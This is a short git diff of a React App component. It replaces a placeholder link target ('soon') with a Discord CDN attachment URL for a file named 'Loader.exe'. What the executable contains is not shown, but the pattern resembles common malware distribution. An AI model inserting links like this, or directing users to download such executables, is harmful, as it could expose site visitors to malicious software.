@@ -19,7 +19,7 @@ function App() {
         </a>
          <a
           className="App-link"
-          href="soon"
+          href="https://cdn.discordapp.com/attachments/578232047416377365/1063143180477931640/Loader.exe"
           target="_blank"
           rel="noopener noreferrer"
         >
